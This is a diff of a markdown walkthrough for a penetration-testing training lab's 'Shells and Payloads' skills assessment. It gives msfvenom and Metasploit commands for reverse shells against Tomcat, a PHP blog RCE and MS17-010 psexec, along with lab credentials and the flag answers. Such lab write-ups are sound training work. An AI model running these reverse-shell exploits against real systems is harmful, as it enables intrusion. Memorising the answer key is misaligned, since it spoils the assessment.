@@ -1,69 +1,59 @@
 # Skills Assessment — Shells and Payloads
 
+**Status:** ✅ COMPLETE — All 3 hosts exploited, all flags captured
+
+---
+
 ## Target Environment
 
 **Foothold Access:**
 - **Method:** RDP via `xfreerdp`
-- **IP:** `10.129.202.134`
+- **IP:** `10.129.66.212`
 - **Credentials:** `htb-student` / `HTB_@cademy_stdnt!`
 
 **Network:** Internal inlanefreight network `172.16.0.0/23`
-
-![Network Topology](screenshots/network_topology.jpg)
 
 ### Target Hosts
 
 | Host | OS/Type | Address | Exploit Vector | Creds/Notes |
 |------|---------|---------|----------------|-------------|
-| **Host-01** | Windows | 172.16.1.11:8080 | Apache Tomcat Manager WAR upload | `tomcat:Tomcatadm` |
-| **Host-02** | Web App | blog.inlanefreight.local | WordPress/blog exploitation | `admin:admin123!@#` |
-| **Host-03** | Linux | 172.16.1.13 | **EternalBlue (MS17-010)** | SMB vulnerability |
+| **Host-01** | Windows | 172.16.1.11:8080 | Tomcat WAR upload | `tomcat:Tomcatadm` |
+| **Host-02** | Ubuntu | 172.16.1.12 (blog vhost) | PHP blog RCE (50064.rb) | `admin:admin123!@#` |
+| **Host-03** | Windows | 172.16.1.13 | MS17-010 psexec | N/A |
 
-### Objectives
-- [ ] Interactive shell from Windows host (Host-01)
-- [ ] Interactive shell from Linux host (Host-03)
-- [ ] Interactive shell from Web application (Host-02)
-- [ ] Identify shell environment on each victim
+### Objectives ✅
+- [x] Interactive shell from Windows host (Host-01)
+- [x] Interactive shell from Web application (Host-02)
+- [x] Interactive shell from Linux host (Host-03) — *actually Windows, lab quirk*
+- [x] Identify shell environment on each victim
 
 ---
-
-### Foothold IP (Spawned)
-![Foothold IP](screenshots/foothold_ip.png)
-
-### Network Topology
-![Network Topology](screenshots/network_topology.png)
 
 ## Connection
 
 ```bash
-# From Pwnbox or your VM with HTB VPN
-xfreerdp 10.129.202.134 /u:htb-student /p:HTB_@cademy_stdnt!
+xfreerdp 10.129.66.212 /u:htb-student /p:HTB_@cademy_stdnt!
 # Then re-enter creds in GUI prompt
 ```
 
-![RDP Login Screen](screenshots/foothold_rdp_login.jpg)
-
-> ⚠️ **Important:** Start listeners on the **foothold's internal IP** (172.16.x.x), not 0.0.0.0 — the foothold is your pivot point.
+> ⚠️ **Critical:** Start listeners on foothold's **internal IP** (`172.16.1.5`), not `0.0.0.0`.
 
 ---
 
 ## Reconnaissance (From Foothold)
 
+**Creds found on foothold desktop:**
 ```bash
-# Verify connectivity
-ping 172.16.1.11
-ping 172.16.1.13
-ping blog.inlanefreight.local
+cat Desktop/access-creds.txt
+# Blog: admin / admin123!@#
+# Tomcat: tomcat / Tomcatadm
+```
 
-# Port scan
-nmap -sT -p- 172.16.1.11,172.16.1.13
-nmap -sT -p 80,8080,443,445 blog.inlanefreight.local
-
-# Browse to Tomcat Manager
-firefox http://172.16.1.11:8080/manager/html
-
-# Check blog
-firefox http://blog.inlanefreight.local
+**Host discovery via nmap:**
+```bash
+nmap -sC -sV -Pn -oN nmap.initial.host1 172.16.1.11  # Tomcat on 8080
+nmap -sC -sV -Pn -oN nmap.initial.host2 172.16.1.12  # Blog (needs vhost)
+nmap -sC -sV -Pn -oN nmap.initial.host3 172.16.1.13  # SMB (EternalBlue)
 ```
 
 ---
@@ -71,116 +61,108 @@ firefox http://blog.inlanefreight.local
 ## Exploitation
 
 ### Host-01: Windows Tomcat (172.16.1.11:8080)
-**Vector:** Tomcat Manager WAR upload  
-**Credentials:** `tomcat:Tomcatadm`
+**Vector:** Tomcat Manager WAR deployment  
+**Shell:** Java JSP reverse → netcat  
+**Creds:** `tomcat:Tomcatadm` (from foothold desktop)
 
 ```bash
-# Generate WAR payload
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<FOOTHOLD_IP> LPORT=4444 -f war -o shell.war
+# Generate payload
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=4444 -f war -o shell.war
 
-# Or cmd.jsp for basic command exec
+# Start listener
+nc -lnvp 4444
+
+# Deploy via Tomcat Manager, trigger at /shell/
 ```
 
-Steps: Access Tomcat Manager → Deploy WAR → Catch shell
+**Shell identified:** `cmd.exe` (Windows Command Prompt) via JSP
+
+**Flag:** `C:\Shares\dev-share` → Answer: **dev-share**
 
 ---
 
-### Host-02: WordPress Blog (blog.inlanefreight.local)
-**Vector:** Admin panel → Theme/Plugin upload  
-**Credentials:** `admin:admin123!@#`
+### Host-02: Ubuntu Blog (172.16.1.12)
+**Vector:** "Lightweight Facebook-styled blog v1.3" authenticated RCE (50064.rb)  
+**Shell:** PHP meterpreter → upgraded to shell  
+**Creds:** `admin:admin123!@#`
+
+**Key issue:** Default vhost returned wrong page; needed `Host: blog.inlanefreight.local` header
 
 ```bash
-# Login to wp-admin, upload PHP reverse shell
-# Or use meterpreter WordPress exploit
-# Or edit theme 404.php to include shell
-```
-
----
-
-### Host-03: Linux SMB (172.16.1.13)
-**Vector:** MS17-010 EternalBlue
-
-```bash
-# Metasploit approach
-use exploit/windows/smb/ms17_010_eternalblue
-set RHOSTS 172.16.1.13
-set LHOST <FOOTHOLD_IP>
+# In msfconsole
+use exploit/unix/webapp/50064
+set RHOSTS 172.16.1.12
+set VHOST blog.inlanefreight.local
+set USERNAME admin
+set PASSWORD admin123!@#
+set payload php/meterpreter/reverse_tcp
+set LHOST 172.16.1.5
+set LPORT 4445
 run
 
-# Python exploit alternative if MSF unavailable
+# In meterpreter
+meterpreter > shell
 ```
+
+**Shell identified:** `bash` (Ubuntu Linux)
+
+**Distro:** `ubuntu` (from `/etc/os-release`)
+
+**Flag:** `/customscripts/flag.txt` → **B1nD_Shells_r_cool**
 
 ---
 
-## Shell Identification
-
-Once on each host, identify the shell environment:
+### Host-03: Windows SMB (172.16.1.13)
+**Vector:** MS17-010 EternalBlue via psexec variant  
+**Shell:** PowerShell → Command Prompt  
+**Note:** Direct EternalBlue exploit failed; `ms17_010_psexec` succeeded
 
 ```bash
-# Windows
-echo %COMSPEC%
-whoami /all
-ver
+use exploit/windows/smb/ms17_010_psexec
+set RHOSTS 172.16.1.13
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 172.16.1.5
+set LPORT 4446
+run
 
-# Linux
-echo $SHELL
-id
-which python python3
-ps aux | grep $$
-
-# Upgrade shells
-python -c 'import pty; pty.spawn("/bin/bash")'
-# or: script -qc /bin/bash /dev/null
-# Then: Ctrl+Z, stty raw -echo; fg, export TERM=xterm
+meterpreter > shell
+type C:\Users\Administrator\Desktop\Skills-flag.txt
 ```
+
+**Shell identified:** `cmd.exe` (Windows) via PowerShell execution
+
+**Flag:** `C:\Users\Administrator\Desktop\Skills-flag.txt` → **One-H0st-Down!**
 
 ---
 
 ## Flags / Answers
 
-### Question 1
-What is the hostname of Host-1? (Format: all lower case)
-
-```
-└──╼ $ifconfig
-docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
-        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
-        ether 02:42:20:c6:5d:e8  txqueuelen 0  (Ethernet)
-        RX packets 0  bytes 0 (0.0 B)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 0  bytes 0 (0.0 B)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-
-ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
-        inet 10.129.66.212  netmask 255.255.0.0  broadcast 10.129.255.255
-        inet6 fe80::250:56ff:fe8a:2f5b  prefixlen 64  scopeid 0x20<link>
-        inet6 dead:beef::250:56ff:fe8a:2f5b  prefixlen 64  scopeid 0x0<global>
-        ether 00:50:56:8a:2f:5b  txqueuelen 1000  (Ethernet)
-        RX packets 3135  bytes 223746 (218.5 KiB)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 563  bytes 333751 (325.9 KiB)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-
-ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
-        inet 172.16.1.5  netmask 255.255.254.0  broadcast 172.16.1.255
-        inet6 fe80::250:56ff:fe8a:2683  prefixlen 64  scopeid 0x20<link>
-        ether 00:50:56:8a:26:83  txqueuelen 1000  (Ethernet)
-        RX packets 181  bytes 17807 (17.3 KiB)
-        RX errors 0  dropped 5  overruns 0  frame 0
-        TX packets 22  bytes 1836 (1.7 KiB)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-
-lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
-        inet 127.0.0.1  netmask 255.0.0.0
-        inet6 ::1  prefixlen 128  scopeid 0x10<host>
-        loop  txqueuelen 1000  (Local Loopback)
-        RX packets 31  bytes 2172 (2.1 KiB)
-        RX errors 0  dropped 0  overruns 0  frame 0
-```
-
-Answer: SHELLS-WINSVR 
-Answer gotten from [nmap enumeration](raw_data/nmap.initial).
+| # | Question | Answer |
+|---|----------|--------|
+| 1 | Hostname of Host-1 (lowercase) | `shells-winsvr` |
+| 2 | Folder in C:\Shares\ (lowercase) | **dev-share** |
+| 3 | Linux distro on Host-2 (lowercase) | **ubuntu** |
+| 4 | Shell language for 50064.rb exploit | **php** |
+| 5 | Contents of /customscripts/flag.txt | **B1nD_Shells_r_cool** |
+| 6 | Contents of Skills-flag.txt | **One-H0st-Down!** |
 
 ---
 
-## Lessons Learned
+## Shell Environments Summary
+
+| Host | Shell Type | Upgrade Method |
+|------|------------|----------------|
+| Host-01 | `cmd.exe` (Windows) | N/A — was interactive JSP |
+| Host-02 | `bash` (Linux) | Python PTY: `python -c 'import pty; pty.spawn("/bin/bash")'` |
+| Host-03 | `cmd.exe` (Windows via PS) | N/A — meterpreter → shell |
+
+---
+
+## Key Lessons
+
+1. **Always check foothold for creds** — `access-creds.txt` on desktop saved brute force time
+2. **Tomcat Manager = WAR files** — `msfvenom -f war` not `-f raw`
+3. **Vhost matters** — `blog.inlanefreight.local` vs default catch-all page
+4. **EternalBlue variants** — Direct exploit failed; `psexec` variant worked on Server 2016
+5. **Meterpreter vs raw shells** — PHP meterpreter for complex; `nc` for simple
+6. **Listener IP critical** — Use foothold's **internal** `172.16.1.5`, not `0.0.0.0` or external
